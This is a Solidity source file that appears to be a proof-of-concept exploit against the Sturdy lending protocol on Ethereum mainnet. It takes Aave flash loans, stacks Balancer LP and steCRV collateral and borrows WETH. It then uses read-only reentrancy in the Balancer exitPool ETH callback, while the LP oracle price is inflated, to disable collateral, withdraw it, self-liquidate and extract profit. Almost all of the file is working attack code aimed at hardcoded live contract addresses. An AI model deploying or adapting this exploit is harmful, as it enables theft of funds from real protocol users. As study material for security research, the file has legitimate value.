// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IWETH9 is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface IwstETH is IERC20 {
    function unwrap(uint256 amount) external returns (uint256);
}

interface ICurvePool {
    function add_liquidity(uint256[2] memory amounts, uint256 minMintAmount) external payable returns (uint256);
    function remove_liquidity_one_coin(uint256 tokenAmount, int128 i, uint256 minAmount) external returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 minDy) external payable;
}

interface IBalancerVault {
    struct JoinPoolRequest {
        address[] assets;
        uint256[] maxAmountsIn;
        bytes userData;
        bool fromInternalBalance;
    }

    struct ExitPoolRequest {
        address[] assets;
        uint256[] minAmountsOut;
        bytes userData;
        bool toInternalBalance;
    }

    function joinPool(bytes32 poolId, address sender, address recipient, JoinPoolRequest memory request) external payable;
    function exitPool(bytes32 poolId, address sender, address payable recipient, ExitPoolRequest memory request) external payable;
}

interface IBalancerQueries {
    function queryJoin(
        bytes32 poolId,
        address sender,
        address recipient,
        IBalancerVault.JoinPoolRequest memory request
    ) external returns (uint256 bptOut, uint256[] memory amountsIn);

    function queryExit(
        bytes32 poolId,
        address sender,
        address recipient,
        IBalancerVault.ExitPoolRequest memory request
    ) external returns (uint256 bptIn, uint256[] memory amountsOut);
}

interface IMetaStablePool is IERC20 {
    function getPoolId() external view returns (bytes32);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface ILendingPool {
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
        external;

    function getUserAccountData(address user)
        external
        view
        returns (
            uint256 totalCollateralETH,
            uint256 totalDebtETH,
            uint256 availableBorrowsETH,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor
        );

    function liquidationCall(address collateralAsset, address debtAsset, address user, uint256 debtToCover, bool receiveAToken)
        external;

    function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;
}

interface ILPVault {
    function depositCollateralFrom(address asset, uint256 amount, address user) external payable;
    function withdrawCollateral(address asset, uint256 amount, uint256 slippage, address to) external;
}

interface ISturdyOracle {
    function getAssetPrice(address asset) external view returns (uint256);
}

contract FlawVerifier {
    IWETH9 internal constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IwstETH internal constant WSTETH = IwstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 internal constant STECRV = IERC20(0x06325440D014e39736583c165C2963BA99fAf14E);
    IERC20 internal constant STETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    ICurvePool internal constant LIDO_CURVE_POOL = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IAaveFlashloan internal constant AAVE_V3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);

    uint256 internal constant FLASHLOAN_WSTETH = 50_000 ether;
    uint256 internal constant FLASHLOAN_WETH = 60_000 ether;
    uint256 internal constant STECRV_SEED_ETH = 1_100 ether;

    uint256 internal _profitAmount;
    uint256 public oraclePriceBeforeExit;
    uint256 public oraclePriceDuringCallback;
    uint256 public oraclePriceAfterExit;
    bool public hypothesisValidated;
    bool public attempted;
    bool public executionSucceeded;
    address public activeLeg;
    bytes public failureData;

    constructor() {}

    function executeOnOpportunity() external {
        require(!attempted, "already-attempted");
        attempted = true;

        address[] memory assets = new address[](2);
        assets[0] = address(WSTETH);
        assets[1] = address(WETH);

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = FLASHLOAN_WSTETH;
        amounts[1] = FLASHLOAN_WETH;

        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;

        try AAVE_V3.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0) {
            executionSucceeded = true;
        } catch (bytes memory reason) {
            failureData = reason;
            executionSucceeded = false;
        }

        if (address(this).balance != 0) {
            WETH.deposit{value: address(this).balance}();
        }

        _profitAmount = WETH.balanceOf(address(this));
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(AAVE_V3), "not-aave");

        _mintSteCrvSeed();
        _runExploitLeg();
        _convertResidualsToWeth(amounts, premiums);
        _approveRepayment(assets, amounts, premiums);
        return true;
    }

    function _mintSteCrvSeed() internal {
        WETH.withdraw(STECRV_SEED_ETH);

        uint256[2] memory curveAmounts;
        curveAmounts[0] = STECRV_SEED_ETH;
        curveAmounts[1] = 0;
        LIDO_CURVE_POOL.add_liquidity{value: STECRV_SEED_ETH}(curveAmounts, 1_000 ether);
    }

    function _runExploitLeg() internal {
        ExploitLeg leg = new ExploitLeg(address(this));
        activeLeg = address(leg);

        require(WETH.transfer(address(leg), WETH.balanceOf(address(this))), "weth-transfer");
        require(WSTETH.transfer(address(leg), WSTETH.balanceOf(address(this))), "wsteth-transfer");
        require(STECRV.transfer(address(leg), STECRV.balanceOf(address(this))), "stecrv-transfer");

        leg.executePath();
    }

    function _convertResidualsToWeth(uint256[] calldata amounts, uint256[] calldata premiums) internal {
        uint256 steCrvBalance = STECRV.balanceOf(address(this));
        if (steCrvBalance != 0) {
            LIDO_CURVE_POOL.remove_liquidity_one_coin(steCrvBalance, 0, 1_000 ether);
        }

        uint256 repayWstEth = amounts[0] + premiums[0];
        uint256 currentWstEth = WSTETH.balanceOf(address(this));
        if (currentWstEth > repayWstEth) {
            WSTETH.unwrap(currentWstEth - repayWstEth);
        }

        uint256 stEthBalance = STETH.balanceOf(address(this));
        if (stEthBalance != 0) {
            require(STETH.approve(address(LIDO_CURVE_POOL), stEthBalance), "steth-approve");
            LIDO_CURVE_POOL.exchange(1, 0, stEthBalance, 1);
        }

        if (address(this).balance != 0) {
            WETH.deposit{value: address(this).balance}();
        }

        uint256 repayWeth = amounts[1] + premiums[1];
        require(WETH.balanceOf(address(this)) >= repayWeth, "insufficient-weth-to-repay");
        require(WSTETH.balanceOf(address(this)) >= repayWstEth, "insufficient-wsteth-to-repay");
    }

    function _approveRepayment(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums
    ) internal {
        require(IERC20(assets[0]).approve(address(AAVE_V3), amounts[0] + premiums[0]), "approve-0");
        require(IERC20(assets[1]).approve(address(AAVE_V3), amounts[1] + premiums[1]), "approve-1");
    }

    function notifyPrices(uint256 beforePrice, uint256 duringPrice, uint256 afterPrice) external {
        require(msg.sender == activeLeg, "only-child");
        oraclePriceBeforeExit = beforePrice;
        oraclePriceDuringCallback = duringPrice;
        oraclePriceAfterExit = afterPrice;
        hypothesisValidated = duringPrice > beforePrice && duringPrice > afterPrice;
        activeLeg = address(0);
    }

    function profitToken() external pure returns (address) {
        return address(WETH);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    receive() external payable {}
}

contract ExploitLeg {
    IWETH9 internal constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IwstETH internal constant WSTETH = IwstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 internal constant STECRV = IERC20(0x06325440D014e39736583c165C2963BA99fAf14E);
    IMetaStablePool internal constant B_STETH_STABLE = IMetaStablePool(0x32296969Ef14EB0c6d29669C550D4a0449130230);
    ILendingPool internal constant LENDING_POOL = ILendingPool(0x9f72DC67ceC672bB99e3d02CbEA0a21536a2b657);
    ILPVault internal constant AURA_BALANCER_LP_VAULT = ILPVault(0x6AE5Fd07c0Bb2264B1F60b33F65920A2b912151C);
    ILPVault internal constant CONVEX_CURVE_LP_VAULT = ILPVault(0xa36BE47700C079BD94adC09f35B0FA93A55297bc);
    IBalancerVault internal constant BALANCER = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IBalancerQueries internal constant BALANCER_QUERIES = IBalancerQueries(0xE39B5e3B6D74016b2F6A9673D7d7493B6DF549d5);
    ISturdyOracle internal constant STURDY_ORACLE = ISturdyOracle(0xe5d78eB340627B8D5bcFf63590Ebec1EF9118C89);

    address internal constant CB_STETH_STABLE = 0x10aA9eea35A3102Cc47d4d93Bc0BA9aE45557746;
    address internal constant CSTECRV = 0x901247D08BEbFD449526Da92941B35D756873Bcd;

    uint256 internal constant JOIN_WSTETH_AMOUNT = 50_000 ether;
    uint256 internal constant JOIN_WETH_AMOUNT = 57_000 ether;
    uint256 internal constant STECRV_COLLATERAL_AMOUNT = 1_000 ether;
    uint256 internal constant BPT_COLLATERAL_AMOUNT = 233_348_773_557_117_598_739;
    uint256 internal constant BORROW_WETH_AMOUNT = 513_367_301_825_658_717_226;

    address internal immutable owner;
    bool internal exitInProgress;
    bool internal callbackUsed;
    uint256 internal priceBeforeExit;
    uint256 internal priceDuringCallback;
    uint256 internal priceAfterExit;

    constructor(address owner_) {
        owner = owner_;
    }

    function executePath() external {
        require(msg.sender == owner, "only-owner");

        // Path stage 1: use flash-loaned wstETH and WETH to mint Balancer LP,
        // while carrying the fresh steCRV minted by the parent from 1,100 ETH.
        _joinBalancerPool();

        // Path stage 2: deposit both B_STETH_STABLE and steCRV as collateral,
        // then borrow WETH against the combined position.
        _depositCollateralAndBorrow();

        // Path stage 3: exitPool triggers the transient ETH callback; during that
        // fake-health window, disable steCRV collateral while the LP oracle is inflated.
        _exitBalancerPoolAndDisableSteCrv();

        // Path stage 4: once oracle state normalizes, withdraw the honest steCRV collateral.
        _withdrawCollateralThenLiquidate();

        // Additional minimal unwind: redeem seized BPT to underlying assets so the
        // parent can repay flash liquidity and report net profit in an existing token.
        _removeBalancerPoolLiquidity();

        if (address(this).balance != 0) {
            WETH.deposit{value: address(this).balance}();
        }

        FlawVerifier(payable(owner)).notifyPrices(priceBeforeExit, priceDuringCallback, priceAfterExit);

        require(WSTETH.transfer(owner, WSTETH.balanceOf(address(this))), "return-wsteth");
        require(WETH.transfer(owner, WETH.balanceOf(address(this))), "return-weth");
        require(STECRV.transfer(owner, STECRV.balanceOf(address(this))), "return-stecrv");
    }

    function _joinBalancerPool() internal {
        bytes32 poolId = B_STETH_STABLE.getPoolId();
        IBalancerVault.JoinPoolRequest memory request = _buildJoinRequest(0);
        (uint256 bptOut,) = BALANCER_QUERIES.queryJoin(poolId, address(this), address(this), request);

        require(WSTETH.approve(address(BALANCER), JOIN_WSTETH_AMOUNT), "approve-join-wsteth");
        require(WETH.approve(address(BALANCER), JOIN_WETH_AMOUNT), "approve-join-weth");

        request = _buildJoinRequest(bptOut);
        BALANCER.joinPool(poolId, address(this), address(this), request);
    }

    function _depositCollateralAndBorrow() internal {
        require(STECRV.approve(address(CONVEX_CURVE_LP_VAULT), STECRV_COLLATERAL_AMOUNT), "approve-stecrv-vault");
        CONVEX_CURVE_LP_VAULT.depositCollateralFrom(address(STECRV), STECRV_COLLATERAL_AMOUNT, address(this));

        require(B_STETH_STABLE.approve(address(AURA_BALANCER_LP_VAULT), BPT_COLLATERAL_AMOUNT), "approve-bpt-vault");
        AURA_BALANCER_LP_VAULT.depositCollateralFrom(address(B_STETH_STABLE), BPT_COLLATERAL_AMOUNT, address(this));

        LENDING_POOL.borrow(address(WETH), BORROW_WETH_AMOUNT, 2, 0, address(this));
    }

    function _exitBalancerPoolAndDisableSteCrv() internal {
        bytes32 poolId = B_STETH_STABLE.getPoolId();
        uint256 bptBalance = B_STETH_STABLE.balanceOf(address(this));
        IBalancerVault.ExitPoolRequest memory request = _buildExitRequest(bptBalance);
        BALANCER_QUERIES.queryExit(poolId, address(this), address(this), request);

        require(B_STETH_STABLE.approve(address(BALANCER), bptBalance), "approve-exit-bpt");

        priceBeforeExit = STURDY_ORACLE.getAssetPrice(CB_STETH_STABLE);
        exitInProgress = true;
        BALANCER.exitPool(poolId, address(this), payable(address(this)), request);
        exitInProgress = false;
        priceAfterExit = STURDY_ORACLE.getAssetPrice(CB_STETH_STABLE);
    }

    function _withdrawCollateralThenLiquidate() internal {
        CONVEX_CURVE_LP_VAULT.withdrawCollateral(address(STECRV), STECRV_COLLATERAL_AMOUNT, 10, address(this));

        (, uint256 totalDebt,,,,) = LENDING_POOL.getUserAccountData(address(this));
        require(WETH.approve(address(LENDING_POOL), totalDebt), "approve-liquidation");
        LENDING_POOL.liquidationCall(address(B_STETH_STABLE), address(WETH), address(this), totalDebt, false);
    }

    function _removeBalancerPoolLiquidity() internal {
        uint256 bptBalance = B_STETH_STABLE.balanceOf(address(this));
        if (bptBalance == 0) {
            return;
        }

        bytes32 poolId = B_STETH_STABLE.getPoolId();
        IBalancerVault.ExitPoolRequest memory request = _buildExitRequest(bptBalance);
        BALANCER_QUERIES.queryExit(poolId, address(this), address(this), request);

        require(B_STETH_STABLE.approve(address(BALANCER), bptBalance), "approve-final-exit");
        BALANCER.exitPool(poolId, address(this), payable(address(this)), request);
    }

    function _buildJoinRequest(uint256 minimumBptOut)
        internal
        pure
        returns (IBalancerVault.JoinPoolRequest memory request)
    {
        uint256[] memory maxAmountsIn = new uint256[](2);
        maxAmountsIn[0] = JOIN_WSTETH_AMOUNT;
        maxAmountsIn[1] = JOIN_WETH_AMOUNT;

        address[] memory assets = new address[](2);
        assets[0] = address(WSTETH);
        assets[1] = address(WETH);

        request = IBalancerVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: maxAmountsIn,
            userData: abi.encode(uint256(1), maxAmountsIn, minimumBptOut),
            fromInternalBalance: false
        });
    }

    function _buildExitRequest(uint256 bptIn)
        internal
        pure
        returns (IBalancerVault.ExitPoolRequest memory request)
    {
        uint256[] memory minAmountsOut = new uint256[](2);
        address[] memory assets = new address[](2);
        assets[0] = address(WSTETH);
        assets[1] = address(0);

        request = IBalancerVault.ExitPoolRequest({
            assets: assets,
            minAmountsOut: minAmountsOut,
            userData: abi.encode(uint256(1), bptIn),
            toInternalBalance: false
        });
    }

    receive() external payable {
        if (exitInProgress && !callbackUsed) {
            callbackUsed = true;
            priceDuringCallback = STURDY_ORACLE.getAssetPrice(CB_STETH_STABLE);
            LENDING_POOL.setUserUseReserveAsCollateral(CSTECRV, false);
        }
    }
}
